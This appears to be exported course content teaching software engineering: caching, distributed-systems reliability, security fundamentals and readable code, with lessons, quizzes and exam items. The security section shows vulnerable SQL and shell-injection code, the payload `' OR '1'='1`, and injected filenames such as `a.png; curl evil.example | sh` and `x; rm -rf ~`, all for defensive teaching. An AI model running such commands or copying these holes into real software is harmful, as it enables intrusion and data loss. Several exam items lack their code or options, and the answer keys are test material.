lesson.text: Caching and invalidation

A **cache** stores computed or fetched results closer to the consumer (in-process, Redis, CDN, browser). It cuts latency and load but introduces a second copy of truth that can go stale. Strategies: **TTL** expiry (simple, bounded staleness), **write-through** or **cache-aside with explicit delete on write** (fresher, more code), and versioned keys. The hard part is invalidation: deleting on every code path that mutates the data, and handling races where a stale read refills the cache after a delete. Also beware **cache stampede**, where a popular key expires and thousands of requests hit the database at once; mitigate with request coalescing, jittered TTLs, or serving stale while refreshing.

Misconceptions: adding a cache does not make a slow query correct, only hides it; 'exactly-once delivery' claims usually mean at-least-once plus deduplication; and microservices do not remove these problems, they create more network boundaries where they appear.

Agents love to add `try/except` with a blind retry loop and a Redis cache to 'fix' performance. Check for: retries around non-idempotent calls without a key, no timeouts, no backoff or jitter, caches with no invalidation story or TTL, and consumers that assume a message arrives once. Tell the agent the consistency requirement explicitly (for example, 'a user must see their own edit immediately') and ask it to state what happens when each dependency times out.

patterns.signal: A remote call has no timeout, or code treats a read timeout as a definite failure
patterns.why: Every remote call needs a deadline. A timeout means the work may or may not have happened, so retry with the same idempotency key or query the status before acting again.

patterns.signal: A downstream dependency is down and request threads pile up waiting on it until the caller dies too
patterns.why: After repeated failures the breaker opens and fails fast, then lets trial calls through to probe recovery. Stops cascades, but you need a fallback and well-tuned thresholds.

patterns.signal: A queue consumer sends duplicate welcome emails after crashes and redeliveries
patterns.why: At-least-once delivery guarantees duplicates eventually. Record processed message ids (or use a natural key) in the same transaction as the side effect and skip repeats.

patterns.signal: Code writes to the database, then publishes an event, and a crash in between loses or fakes the event
patterns.why: Insert the event into an outbox table in the same transaction as the state change; a relay publishes it afterwards. Gives at-least-once publishing, so consumers must still dedupe.

patterns.signal: One business operation spans several services' databases and no distributed transaction is available
patterns.why: Run local transactions step by step and on failure run compensations (refund, release stock) in reverse. Intermediate states are visible, and compensations must be idempotent.

patterns.signal: A scheduled job runs on every replica and should run on exactly one
patterns.why: Replicas compete for an expiring lease in a coordinator (etcd, ZooKeeper, a DB row). A paused old leader may still act, so protect writes with a fencing token.

patterns.signal: A read-heavy lookup hits the database every time and can tolerate a few seconds of staleness
patterns.why: Read the cache, on miss load from the DB and populate it; on write, invalidate the key. Simple and only caches what is used, but the first read is slow and staleness is bounded only by TTL.

patterns.signal: Reads right after a write must see the new value and the cache sits in front of every read
patterns.why: Writes update the cache and the store together, so cached reads are fresh. Write latency rises, and you cache data that may never be read; pair with TTLs to evict it.

patterns.signal: A hot cache key expires and thousands of identical queries hit the database at once
patterns.why: Let one request recompute while others wait or serve the stale value (single-flight, a lock, early refresh), and jitter TTLs so keys do not expire together. Adds complexity to the cache path.

patterns.signal: Keys are spread over cache nodes with `hash(key) % N` and adding one node invalidates almost everything
patterns.why: Nodes sit on a hash ring and only about 1/N of keys move when one is added or removed. Use virtual nodes to even out the load; hot single keys still need separate handling.

patterns.signal: A user saves their profile, is redirected, and sees old data because reads go to an async follower
patterns.why: Route that user's reads to the leader for a short window, or until the follower has caught up to their write position. Costs leader load and session-aware routing.

patterns.signal: A design requires strong consistency and full availability even during network partitions
patterns.why: During a partition you must refuse some requests or serve possibly stale data; even when healthy, stronger consistency costs latency. Decide per operation: balances vs like counts.

keyPoints: A remote call can succeed, fail, or be unknown; design for the unknown outcome.
During a partition you choose consistency or availability; PACELC adds the everyday latency vs consistency trade-off.
Async replication is fast but can lose recent writes and serve stale reads; consistency models name what reads may see.
Queues are typically at-least-once, so consumers must be idempotent.
Retry only idempotent work, with timeouts, backoff and jitter; caches need an invalidation and stampede plan.

quiz.q: A service calls a payment API and gets a read timeout. What is the safest correct treatment?
options: Treat it as unknown, retry with the same idempotency key, then reconcile
Assume it failed and ask the user to submit a fresh payment request
Assume it succeeded and mark the order paid to avoid double charges
Retry with a new idempotency key so the server cannot replay an error
quiz.explain: A timeout does not reveal whether the server acted. Reusing the same idempotency key makes the retry safe whichever way the first attempt went.

quiz.q: A queue delivers at-least-once. A consumer that sends welcome emails keeps sending duplicates after crashes. What is the correct fix?
options: Switch to a broker advertising exactly-once and drop the dedupe checks
Set the visibility timeout to zero so messages are redelivered sooner
Process messages on a single thread so each is handled only once
Make the consumer idempotent, e.g. skip message IDs already processed
quiz.explain: Duplicates are inherent to at-least-once delivery. Idempotent handling (deduplication by message or business ID) gives effectively-once behavior; a single thread still sees redeliveries.

quiz.q: According to PACELC, what trade-off exists even when the network is healthy?
options: Partition tolerance versus durability
Throughput versus storage cost
Availability versus security
Latency versus consistency
quiz.explain: Without a partition, waiting for replicas to confirm writes improves consistency but adds latency. That is the 'Else' clause of PACELC.

quiz.q: A user edits their profile, is redirected, and sees the old data. Reads go to an asynchronous follower. Which mitigation fits?
options: Route that user's reads to the leader briefly after a write
Remove the redirect so the browser keeps the submitted form
Raise the cache TTL so the profile page is served consistently
Disable replication and serve every read from a nightly backup
quiz.explain: The follower lagged behind the leader. Read-your-writes consistency targets exactly this symptom without requiring strong consistency for everyone.

quiz.q: A hot cache key expires and the database collapses under thousands of simultaneous identical queries. What is this and how do you reduce it?
options: A deadlock; add a lock timeout so blocked queries fail fast
A partition; add replicas so the reads spread across nodes
A cache stampede; coalesce loads, jitter TTLs, or serve stale
A phantom read; use serializable isolation for the page query
quiz.explain: Simultaneous misses on one expired key all go to the origin. Coalescing or stale-while-revalidate collapses them to a single refill.

quiz.q: An order service commits the order row, then publishes `OrderPlaced` to the broker. After a pod crash between the two steps, the warehouse never hears about some committed orders. What should you reach for?
options: Retry the broker publish in a loop inside the same web request
Write the event to an outbox table in the same transaction
Publish the event first and write the order row only afterwards
Add a circuit breaker around all of the broker client calls
quiz.explain: Putting the event in the same transaction as the state change means a crash cannot separate them. Retries in memory die with the pod, and publishing first just swaps which half can be lost.

topics.title: Security Fundamentals
topics.summary: Threat modeling, authN vs authZ, injection and other top risks, secrets management, and least privilege.

lesson.text: You ship a search feature in an afternoon. A week later someone enters `' OR '1'='1` and downloads your users table. Security failures are rarely exotic: most are a small set of well-known mistakes in how software treats untrusted input, identity and secrets. You cannot bolt security on at the end, and you cannot delegate it entirely to a tool, so you need the vocabulary and the habits.
Threat modeling

**Threat modeling** is asking, before building: what are we protecting (assets), who might attack it and how (adversaries, entry points), and what is the impact if it happens? A lightweight version is four questions: What are we building? What can go wrong? What are we doing about it? Did we do a good job? Identify **trust boundaries**, where data crosses from a less-trusted to a more-trusted zone (browser to server, public internet to internal service, user content to your database). Everything crossing a boundary is untrusted until validated. Prioritize by likelihood times impact, not by what is most fun to defend.
Authentication vs authorization

items: **Authentication (authN)**: who are you? Passwords (hashed with bcrypt, scrypt or Argon2, never encrypted or plain), passkeys, OAuth/OIDC sign-in, MFA.
**Authorization (authZ)**: what are you allowed to do? Checked on **every request, on the server**, for the specific resource.

lesson.text: The most common real-world flaw is broken access control, especially **IDOR** (insecure direct object reference): `GET /invoices/1042` returns the invoice to any logged-in user because the code checks that you are authenticated but not that invoice 1042 is yours. Hiding buttons in the UI is not authorization.
OWASP Top 10 themes

The OWASP Top 10 is a periodically updated ranking of the most critical web risks. The current edition (2025) lists: broken access control, security misconfiguration, software supply chain failures, cryptographic failures, injection, insecure design, authentication failures, software or data integrity failures, security logging and alerting failures, and mishandling of exceptional conditions. Server-side request forgery (SSRF), a separate category in 2021, is now folded into broken access control, and 'vulnerable and outdated components' was widened into supply chain failures. Broken access control has held the top spot since 2021. Learn the categories as a checklist for review rather than memorizing numbers.
Injection

**Injection** happens when untrusted data is concatenated into a command or query so the interpreter treats it as code. SQL injection is the classic; command injection, template injection, and **XSS** (injecting script into pages) are siblings. The fix is the same principle: keep code and data separate.

# VULNERABLE: input becomes part of the SQL
name = request.args['name']
db.execute("SELECT * FROM users WHERE name = '" + name + "'")

# SAFE: parameterized query; the driver sends data separately from code
db.execute('SELECT * FROM users WHERE name = %s', (name,))

# VULNERABLE command injection
os.system('convert ' + filename + ' out.png')
# SAFE: no shell, argument list
subprocess.run(['convert', filename, 'out.png'], check=True)

lesson.caption: Concatenation lets the input's quote end the string and turn the rest into SQL; a parameterized query keeps the input as data.

lesson.text: For XSS, rely on frameworks that escape output by default, and avoid raw-HTML insertion APIs with user content. Validate input for shape (length, type, allowed values) but treat validation as a supplement: parameterization and output encoding are the real defenses.
Secrets management

A **secret** is anything that grants access: API keys, database passwords, signing keys, tokens. Never commit them to Git; history is forever and bots scan public repos within minutes. Keep them in environment variables injected at runtime or in a secrets manager (Vault, cloud secret stores), keep `.env` in `.gitignore`, and use separate secrets per environment. Assume leaks will happen: support **rotation**, scope each key narrowly, and if one is committed, revoke and rotate it immediately because deleting the commit does not un-leak it.
Least privilege

Give every user, service and token only the permissions required for its job, for only as long as needed. The reporting service gets a read-only database role; the CI deploy token cannot read production secrets; the app's DB user cannot `DROP TABLE`. This does not stop the first breach but limits the **blast radius** when it happens. Combine with **defense in depth**: several independent layers so one failure is not fatal.

AI-generated code often builds SQL with f-strings, checks login but not ownership, logs tokens, hard-codes example keys that become real ones, and runs with broad credentials because that makes the demo work. Give the agent your threat context ('multi-tenant, users must never see another tenant's data'), require parameterized queries and per-resource authorization checks, and never paste real secrets into a prompt. Treat any content an agent reads (web pages, issues, files) as untrusted input that may contain instructions aimed at the agent; keep its credentials minimal and its destructive actions gated.
Do not roll your own cryptography or password storage. Use vetted libraries and managed identity providers, and keep dependencies updated; many breaches exploit a known flaw in an old package.

patterns.signal: SQL is built by concatenating or formatting user input into the query string
patterns.why: Placeholders send data separately from the SQL text, so input can never become code. Identifiers such as column names cannot be parameters; pick those from an allowlist.

patterns.signal: A shell command string is assembled with a filename or argument that comes from a user
patterns.why: Pass an argv array to the process API with shell execution off, so `;` or `$()` stay literal. Still validate the values, and reject leading `-` that could become an option.

patterns.signal: User-supplied text is inserted into HTML, attributes or inline scripts
patterns.why: Escape for the exact context at render time, ideally via an auto-escaping template engine. Raw-HTML escape hatches bypass it; add a Content Security Policy as a second layer.

patterns.signal: `GET /api/invoices/1042` returns any invoice to any logged-in user who changes the id
patterns.why: Authentication proves who the caller is; every request must also check server-side that this caller may access this specific record. Unguessable ids help but are not access control.

patterns.signal: An API key or password was committed to a repository, even if removed in the next commit
patterns.use: Revoke and rotate the leaked secret
patterns.why: Git history, forks and scanners keep it forever, and bots find public keys in minutes. Revoke and issue a new one first, then check logs for misuse; history rewriting is optional cleanup.

patterns.signal: Credentials live in source files, config committed to git, or are shared over chat
patterns.why: Store secrets in a vault or the platform's secret store and inject them at runtime, with access control, audit logs and rotation. Keep them out of logs and error messages too.

patterns.signal: A read-only report job connects to the database as the owner account
patterns.why: A dedicated role with `SELECT` on just the needed tables limits the blast radius if the job is compromised or buggy. Costs some setup and occasional permission requests.

patterns.signal: Passwords are stored with a fast hash like SHA-256 or MD5, or unsalted
patterns.why: Use Argon2id, scrypt or bcrypt with a per-user salt so offline guessing is expensive. Tune the cost to tens of milliseconds per login; never encrypt passwords reversibly.

patterns.signal: A new feature handles payments, uploads or admin actions and nobody has asked what could go wrong
patterns.why: List assets, trust boundaries, plausible attackers and impact before building, then put controls where input crosses a boundary. A short whiteboard session beats auditing afterwards.

patterns.signal: A single control, such as the firewall or the login page, is the only thing protecting sensitive data
patterns.why: Layer independent controls (authz checks, encryption, network rules, monitoring) so one mistake is not a breach. Each layer adds cost, so prioritise by asset value from the threat model.

keyPoints: Threat model first: assets, trust boundaries, plausible attackers, impact.
AuthN proves identity; authZ must be enforced server-side on every request for the specific resource (watch for IDOR).
Injection comes from mixing code and data; use parameterized queries, argument lists and output escaping.
Keep secrets out of source control, rotate them, and revoke anything that leaked.
Least privilege and defense in depth shrink the blast radius of inevitable mistakes.

quiz.q: `GET /api/invoices/1042` returns any invoice to any logged-in user who guesses the ID. Which category of flaw is this?
options: SQL injection through the numeric invoice ID in the path
Cross-site scripting via the invoice data in the response
Weak password hashing that lets users log in as others
Broken access control (IDOR): login checked, ownership not
quiz.explain: The user is authenticated, but the server fails to verify they are authorized for that specific resource. That is an insecure direct object reference.

quiz.q: Which is the most reliable defense against SQL injection?
options: Parameterized queries, so input is never parsed as SQL
Stripping or escaping quote characters in all input
Hiding database error messages from API responses
Limiting form field length to block long payloads
quiz.explain: Parameterization separates code from data structurally. Character stripping is fragile (numeric contexts, encodings), and hiding errors or limiting length only makes attacks slightly harder.

quiz.q: An API key is accidentally committed to a public repo, and you delete it in the next commit within a minute. What should you do?
options: Nothing; the key no longer appears in the latest commit
Force-push rewritten history, which removes every copy
Revoke and rotate the key now; it may already be harvested
Make the repo private and keep using the same key
quiz.explain: Automated scanners harvest keys quickly, and forks, clones and caches keep history. Only revocation actually removes the risk.

quiz.q: Which statement best describes authentication versus authorization?
options: AuthN decides what you may do; authZ verifies who you are
They are one check, performed at login and again per request
AuthZ is only needed for admins; authN covers everyone else
AuthN verifies identity; authZ decides if it may act on a resource
quiz.explain: AuthN answers 'who', authZ answers 'may this identity do this to this resource'. Each request needs both.

quiz.q: A nightly report job needs to read three tables. It currently connects as the database owner. What does least privilege suggest?
options: Keep the owner role so the job never hits permission errors
Keep the owner role but rotate its password every week
Create a dedicated role with SELECT on only those three tables
Run the job inside the web server so it reuses its credentials
quiz.explain: A narrowly scoped read-only role limits damage if the job or its credentials are compromised. Rotation helps but leaves the blast radius unchanged.

quiz.q: A thumbnail endpoint runs `convert ` + filename + ` out.png` through a shell. A user uploads a file named `a.png; curl evil.example | sh`. Which approach fits best?
options: Strip semicolons and pipes from the filename before running it
Use parameterised queries when saving the filename to the database
Pass the program and arguments as a list, with the shell off
Escape the filename for HTML before it is shown in the page
quiz.explain: With an argument list and no shell, metacharacters stay literal. Stripping a blacklist of characters is easy to bypass (`$()`, newlines), and SQL or HTML escaping protects different sinks.

exam.q: A service checks `if os.environ.get('MAINTENANCE_MODE'):` and the deployment sets `MAINTENANCE_MODE=false`. What happens?
options: Maintenance mode turns on, because the non-empty string 'false' is truthy
Maintenance mode stays off, because Python parses 'false' as False
The process fails to start, since env values must be 'true' or '1'
Maintenance mode stays off, because unset and 'false' are equivalent
exam.explain: Environment values are always strings. Any non-empty string, including 'false' and '0', is truthy in Python, so the value must be parsed explicitly.

exam.q: An agent reports it 'fixed' an HTTPS error in your internal client by setting `verify=False`. What is the correct reaction?
options: Accept it; the error is gone, so the connection is now working
Accept it for internal traffic only, since the internal network is trusted
Reject it: it drops server authentication; trust the right CA or fix the cert
Reject it, and switch the client to plain HTTP to avoid certificate issues
exam.explain: Disabling verification silences the symptom by discarding TLS's identity guarantee, enabling man-in-the-middle attacks even on internal networks. Fix the root cause (untrusted CA or mismatched certificate); plain HTTP is worse still.

exam.q: A user request passes through an API gateway, then a service, then a database client library. During a database outage, each of those three layers makes up to 3 attempts on failure. How many calls can one user request send to the database?
exam.explain: Attempts multiply across layers: 3 x 3 x 3 = 27. Stacked retries amplify load on a struggling dependency, which is why you retry at one layer only, with a capped budget and backoff.

exam.q: Why does HTTP/3 run over QUIC on UDP instead of over TCP?
options: UDP guarantees delivery, so QUIC needs no retransmission logic
QUIC's per-stream reliability avoids TCP's head-of-line blocking
UDP traffic bypasses firewalls, so HTTP/3 does not need TLS
TCP cannot carry encrypted traffic once TLS 1.3 is negotiated
exam.explain: QUIC rebuilds reliability, ordering and encryption per stream on top of UDP, so one lost packet stalls only its own stream. UDP itself guarantees nothing, and QUIC always uses TLS 1.3.

exam.q: Your API list endpoint returns every row. It works in staging with 200 rows and times out in production with 5 million. What is the best design change?
options: Raise the server and client timeouts to 10 minutes
Gzip the full response to cut its transfer time
Cache the full response in Redis for a whole day
Paginate with a cursor and enforce a max page size
exam.explain: Unbounded responses do not scale. Bounded pages protect memory, latency and the database, and cursors stay fast on deep, changing data. Timeouts, compression and caching only postpone the failure.

exam.q: Your Postgres leader replicates asynchronously to a follower. The leader's disk dies and you promote the follower. Customers report orders that were confirmed seconds earlier are now missing. Why?
options: Promotion rolls back the last minute of transactions for safety
Acknowledged writes had not reached the follower; sync replication avoids this
The follower rejected those rows as foreign key violations on promotion
Read-your-writes routing sent the customers to a stale application cache
exam.explain: With asynchronous replication the leader confirms a commit before followers have it, so a leader crash loses the replication lag. Synchronous replication closes the gap at the cost of write latency (the PACELC latency vs consistency trade-off).

exam.q: A query joining `orders` to `order_items` on `order_id` is slow, and `EXPLAIN` shows a sequential scan of `order_items`. What is the most likely fix?
options: Add an index on `order_items(order_id)`, the join column
Raise the isolation level so the join reads a stable snapshot
Denormalize customer email into `order_items` to skip a join
Run VACUUM FULL on `order_items` to shrink the table on disk
exam.explain: Postgres does not index foreign key columns automatically. A sequential scan on the join column indicates a missing index; isolation level and denormalizing unrelated columns do not change the access path.

exam.q: An agent writes `os.system('convert ' + filename + ' out.png')` to process user uploads. What should you require?
options: Wrap the filename in single quotes inside the command string
Run the conversion only for users who are logged in
Reject filenames longer than 255 characters beforehand
Pass an argument list to `subprocess.run`, with no shell
exam.explain: Building a shell string lets a filename like `x; rm -rf ~` become a command. An argument list without a shell keeps it as data. Hand-added quotes break on filenames containing quotes, and login or length checks do not stop injection.

exam.q: Which is the best description of a file descriptor?
options: A per-process integer handle for an open file, pipe or socket
The permission string (such as rwxr-xr-x) stored with a file
An in-memory copy of a file's contents kept by the kernel
The absolute path the kernel uses to locate an executable
exam.explain: File descriptors are small integers indexing the process's table of open resources, subject to a per-process limit.

exam.q: Two transactions each check that at least one doctor is on call, then each takes a different doctor off call. Both commit and nobody is on call. Which concept explains this and what prevents it?
options: A dirty read; prevent it by switching to read uncommitted
A deadlock; prevent it with an index on the on-call column
Write skew; use serializable isolation or lock the checked rows
A lost update on one row; prevent it with an atomic UPDATE
exam.explain: Each transaction made a decision from a snapshot that the other invalidated, while writing different rows, so no single-row lost update or dirty read occurred. Serializable isolation or explicit locking forces the conflict to surface.

exam.q: You must expose the same data to a web app, a mobile app, and partners, each needing different field subsets. The current REST API forces many round trips and over-fetching. Which statement is the most reasonable?
options: REST responses cannot be cached, so any alternative is better
GraphQL fits varied field needs but adds cost, caching and N+1 work
GraphQL resolves fields on the client, so no server authZ is needed
gRPC is the standard choice here because browsers call it natively
exam.explain: GraphQL targets exactly this pain but brings query-cost control, harder HTTP caching and server-side N+1 risks, so weigh it against tailored REST endpoints. REST caches well, authorization is always server-side, and browsers need gRPC-Web proxies.

exam.q: Product prices are cached in Redis using cache-aside with no TTL. After an admin changes a price in the database, the site keeps showing the old price indefinitely. What fixes it?
options: Add retries around Redis reads so they eventually see the new value
Give Redis more memory so the new price can sit beside the old one
Read prices from a database replica rather than from the primary
Delete the key in the price-update path, and add a TTL as a backstop
exam.explain: Cache-aside only refills on a miss, so with no TTL and no invalidation the stale entry lives forever. Deleting on write fixes the normal path; a TTL bounds staleness if some write path forgets.

exam.q: A teammate says: 'The app hides the Delete button for non-admins, so the API doesn't need a permission check.' What is the problem?
options: None; non-admins never see the button, so they cannot delete
Anyone can call the API directly, so the server must check each request
Hiding is fine as long as the API route is not documented anywhere
It only needs a confirmation dialog to stop accidental deletions
exam.explain: Client-side hiding is a convenience, not a control. Attackers send requests directly and routes are easy to discover, so the server must check permissions.

exam.q: Assuming the request is idempotent, which response should a generic HTTP client automatically retry?
options: 400 Bad Request for a missing field
422 Unprocessable Content for a bad email
503 Service Unavailable with Retry-After: 5
403 Forbidden for a resource you cannot access
exam.explain: 5xx responses like 503 signal a server-side, often transient problem, and Retry-After says when to try again. 4xx errors mean the request itself must change; resending it unchanged will fail the same way.

exam.q: Put the steps of a first visit to `https://shop.example.com/cart` in order (nothing is cached yet).
steps: DNS resolves `shop.example.com` to an IP address
TCP handshake to that IP on port 443
TLS handshake: the browser verifies the certificate and agrees keys
Browser sends `GET /cart` over the encrypted connection
Browser parses the HTML and fetches its CSS, JS and images
exam.explain: You need an IP before you can open a connection, a TCP connection before TLS can run over it, and an encrypted session before the HTTP request is sent. Subresources are only discovered once the HTML arrives.

exam.q: Kubernetes stops a pod running a well-behaved HTTP server. Put the shutdown in order.
steps: Kubernetes sends `SIGTERM` to the process
The handler stops accepting new requests
In-flight requests finish (drain)
Buffers are flushed
The process exits with status 0 before the grace period ends
exam.explain: `SIGTERM` starts a graceful shutdown. The server closes the door to new work first, then finishes what it already accepted, flushes, and exits. If it is still running when the grace period ends, it gets `SIGKILL`, which cannot be caught.

exam.q: A consumer reads from an at-least-once queue and must charge each order effectively once. Order its steps.
steps: Receive the message
Look up the message id in a processed-ids table and skip it if already there
Apply the effect and record the message id in one transaction
Acknowledge the message to the queue
exam.explain: Acknowledge last: a crash before the ack means the message is redelivered, and the processed-ids check turns that duplicate into a no-op. Recording the id in the same transaction as the effect means you can never have one without the other.

exam.q: Click the line that makes this query unsafe.
exam.code:
def find_orders(db, email, status):
    status = status.lower()
    if status not in ('open', 'shipped', 'cancelled'):
        raise ValueError('bad status')
    sql = ('SELECT o.id, o.total_cents FROM orders o '
           'JOIN customers c ON c.id = o.customer_id '
           "WHERE c.email = '" + email + "' AND o.status = %s")
    rows = db.execute(sql, (status,))
    return [dict(r) for r in rows]
exam.explain: Line 7 concatenates the user-supplied `email` into the SQL text, so an input like `' OR '1'='1` changes the query (SQL injection). `status` is already allow-listed and parameterized. Fix: use `WHERE c.email = %s AND o.status = %s` and pass `(email, status)`.

exam.q: This retry loop can charge a customer twice. Click the buggy line.
exam.explain: Line 3 makes a new idempotency key on every attempt. If the first request succeeded but timed out on the way back, the retry carries a different key and the server charges again. Fix: derive the key once, before the loop, from the business operation, e.g. `key = 'charge-' + order_id`.

exam.q: This server never shuts down gracefully. Click the buggy line.
exam.code:
import signal, sys

def shutdown(signum, frame):
    server.stop_accepting()
    server.drain(timeout=20)
    sys.exit(0)

signal.signal(signal.SIGKILL, shutdown)
server.serve_forever()
exam.explain: Line 8 registers the handler for `SIGKILL`, which cannot be caught or ignored (Python raises an error here). Process managers send `SIGTERM` first, so register for that: `signal.signal(signal.SIGTERM, shutdown)`.

exam.q: What does this print?
exam.code:
import os, subprocess

os.environ['MODE'] = 'debug'
subprocess.run(['sh', '-c', 'export MODE=prod; echo $MODE'])
print(os.environ['MODE'])
options: `debug` then `debug`
`prod` then `prod`
`prod` then `debug`
`debug` then `prod`
exam.explain: The child inherits `MODE=debug`, then its own `export` changes its copy, so it prints `prod`. Changes in a child never propagate back to the parent, so Python still sees `debug`.

exam.q: What does this print?
options: A `KeyError` on the second call
exam.explain: Cache-aside only reads the database on a miss. The first call fills the cache with `500`; the update writes only to `db` and nothing deletes the key or expires it, so the second call returns the stale `500`.

title: Building Software
tagline: Write, structure, version and test code that others can safely change.
intro: Code is read far more often than it is written, and an AI agent can produce thousands of lines in minutes. That makes the fundamentals of structure, history, tests and contracts the main way you keep control of what ships. This section gives you the vocabulary and judgment to direct agents, review their output and keep a codebase healthy.

topics.title: Readable code
topics.summary: Names, small functions and why-comments that let the next reader change code safely.

lesson.text: You open a function called `process(d, f)` and find 90 lines of nested conditionals. Nothing is technically wrong with it, but you cannot change it without fear. The cost of software is dominated by reading and modifying it, not by typing it the first time. Readable code is code whose intent can be recovered quickly by someone who did not write it, including you in six months.
Names carry most of the meaning

A good name says what something is or does at the level of the problem domain, not how it is stored. `days_until_expiry` beats `d`; `is_eligible_for_refund` beats `flag2`. Names should be proportional to scope: `i` is fine in a three-line loop, but a module-level constant needs a full description. Prefer nouns for values, verbs for functions, and booleans that read as questions (`has_access`, `is_empty`). Avoid vague containers such as `data`, `info`, `manager`, `utils`, which tell the reader nothing.
Functions that do one thing at one level

A function should operate at a single level of abstraction. If one function both parses a request, applies pricing rules and formats an email, the reader must hold all three concerns at once. Extracting well-named helpers turns the body into an outline. The goal is not tiny functions for their own sake; it is that each function has a name you can trust without reading the body.

items: Keep parameter lists short; three or more related parameters often want to be a single object.
Avoid boolean flag parameters (`render(true)`): the call site is unreadable. Use two functions or a named option.
Return early to handle edge cases and keep the main path unindented (guard clauses).
Avoid hidden side effects: a function named `get_user` should not also write to the database.

lesson.text: Behavior is identical, but the second version names the magic numbers, the concepts and the rule. A reviewer can now spot that the discount applies only to loyalty customers without decoding index positions.
Comments explain why, not what

A comment that restates the code (`# increment i`) is noise that rots when the code changes. Comments earn their place when they record what the code cannot say: why this approach was chosen, which external constraint forced it, what bug it works around, or what would break if someone simplified it. If you feel the need to explain what a block does, first try renaming or extracting so the code explains itself.

# Retry once: the payments API returns 409 for ~1% of requests when two
# webhooks race; a second call is idempotent and succeeds. See incident #482.
response = charge(order, retries=1)
Delete commented-out code. Version control remembers it; the file should show only what is live.
Consistency and simplicity over cleverness

A codebase that does the same thing the same way everywhere is easier to navigate than one where each file is locally optimal. Follow the existing conventions for naming, error handling and layout, and let a formatter and linter enforce the mechanical ones so reviews focus on substance. Prefer the boring, obvious construct to the clever one: a plain loop beats a nested one-liner of chained comprehensions when the latter needs a minute to decode. Cleverness is a loan the next reader repays with interest.
Common pitfalls

items: Over-abstraction: splitting into dozens of one-line functions can scatter logic and hurt readability just as much as a monolith.
Misleading names: a name that is slightly wrong is worse than a vague one, because readers trust it.
Comments that drift: when behavior changes and the comment does not, the comment becomes a lie.
Treating readability as taste: it is testable. Ask a colleague to explain the code back to you.

lesson.text: Agents produce plausible-looking code fast, and they happily generate generic names like `data`, `result` and `helper`, redundant what-comments on every line, and slightly different styles across files. Tell the agent to follow the conventions of neighboring files, and run the formatter and linter automatically. When reviewing, read for intent: can you state in one sentence what each function does? If not, ask the agent to rename and restructure before you merge, because you are the one who will maintain it.

patterns.signal: Edge-case checks wrap the main logic in three levels of nested `if`, and the real work sits at the deepest indent
patterns.why: Handle invalid or trivial cases first and return, so the happy path reads top to bottom at one indent. Keep each guard short; a dozen guards hint the function does too much.

patterns.signal: You need comment headers like `# parse`, `# apply pricing`, `# send email` to navigate one long function
patterns.why: Each section becomes a named function at one level of abstraction, and the parent reads like a summary. Do not shred it into vague `step3` helpers; scattering logic hurts as much as a monolith.

patterns.signal: A bare literal like `0.0725` or `86400` sits in a calculation and a reviewer has to ask what it means
patterns.why: `SALES_TAX_RATE` states the meaning, gives one place to change it and makes the rule reviewable. Skip it for self-evident values like `0`, `1` or an index of `-1`.

patterns.signal: A call site reads `export(report, true, false)` and nobody can tell what the booleans do
patterns.why: Split into two intent-named functions or pass a named option (`include_charts=True`). Flags usually mean the function does two things; separate functions also remove a branch inside.

patterns.signal: Variables are named `data`, `tmp`, `flag2` or `userList`, describing storage rather than meaning
patterns.why: `days_until_expiry` or `is_eligible_for_refund` carries the domain rule to every reader. A slightly wrong name is worse than a vague one because readers trust it, so rename when meaning changes.

patterns.signal: A condition like `if (a && !b || c && d > 3)` needs a minute of decoding before the branch makes sense
patterns.why: Assign parts to names like `is_overdue` and `has_override`, then test those. Costs a line or two, buys a readable rule; extract a predicate function if the same check repeats.

patterns.signal: A comment restates the next line (`# increment i`) or explains what a cryptic name should have said
patterns.why: Rename until the code says what it does, and keep comments for what code cannot say: why this approach, which bug it avoids, links to the spec. What-comments rot silently when code changes.

patterns.signal: Four or more related parameters travel together through several functions (`start`, `end`, `tz`, `inclusive`)
patterns.why: A `DateRange` type names the concept, shortens signatures and gives validation one home. Do not bundle unrelated parameters just to shorten a list; that hides dependencies.

patterns.signal: A one-line nested comprehension with a ternary inside earns a 'clever' in review but takes minutes to verify
patterns.why: A plain loop with named steps is easier to read, debug and change, and the speed difference is usually nil. Keep compact idioms only where the team reads them fluently.

keyPoints: Code is read far more than written, so optimize for the next reader.
Good names reflect domain meaning; bad names like data or flag2 hide intent.
Functions should do one thing at one level of abstraction.
Comments should explain why, not restate what the code does.
Consistency and simplicity beat cleverness; let tools enforce formatting.

quiz.q: Which comment most clearly earns its place in a codebase?
options: `# Loop over all users and add each balance to the running total`
`# Sort descending: the billing API reads only the first 10 rows`
`# TODO: refactor this later when there is time to clean it up`
`# Set the rate variable to 0.9 so the discount gets applied`
quiz.explain: It records a reason and an external constraint that the code cannot express. The others restate the code or defer work without giving any information.

quiz.q: A teammate calls `export(report, true, false)`. What is the best readability fix?
options: Add a comment at each call site explaining the two flags
Rename the function to `exportReport` for added clarity
Reorder the parameters so the two booleans come first
Replace the flags with named options or separate functions
quiz.explain: Unnamed boolean flags make call sites unreadable; named options or distinct functions make intent visible where the call is made. Comments drift, and renaming or reordering leaves the flags just as opaque.

quiz.q: Which change best improves `def f(x): return x * 0.0725` ?
options: Add a docstring stating that it multiplies x by a rate
Inline the expression into every caller to remove indirection
Name it `sales_tax(subtotal)` and make 0.0725 a named constant
Rename `x` to `value` and `f` to `compute` for clarity
quiz.explain: A domain name and a named constant expose both intent and the business rule. Generic renames add nothing, a what-docstring restates the code, and inlining spreads the magic number.

quiz.q: Why is a clever one-line nested comprehension often a poor choice?
options: Every future reader pays the cost of decoding it
It always executes more slowly than the equivalent loop
Most languages forbid nesting comprehensions this deeply
Linters and formatters are unable to parse nested ones
quiz.explain: The cost is human comprehension, not machine speed or tooling. Clever constructs are often fine for the machine but expensive for every later reader.

quiz.q: You split a 200-line function into 40 five-line functions with vague names like `step3`. What is the likely outcome?
options: Readability improves, since shorter functions are always clearer
Runtime performance improves, since small functions inline well
Logic is scattered, and readers jump around without gaining meaning
Unit tests become unnecessary, since each piece is trivially right
quiz.explain: Extraction helps only when each piece has a trustworthy, meaningful name. Vague fragments add indirection without clarity.

quiz.q: `ship_order()` checks the cart, then stock, then the address, each inside another `if`; the actual shipping call sits five indents deep with the failure branches trailing below it. Which approach fits best?
options: Check each failure case first and return early, leaving the main path flat
Extract each nested block into its own helper function but keep the same nesting depth
Add a comment header above each nesting level to explain it
Pass a boolean flag so callers choose which checks to run
quiz.explain: Guard clauses handle the edge cases up front so the main logic reads top to bottom. Extracting the blocks keeps the same deep nesting and just moves it elsewhere.

topics.title: Design principles
topics.summary: Cohesion, coupling, SOLID, composition and when not to abstract.

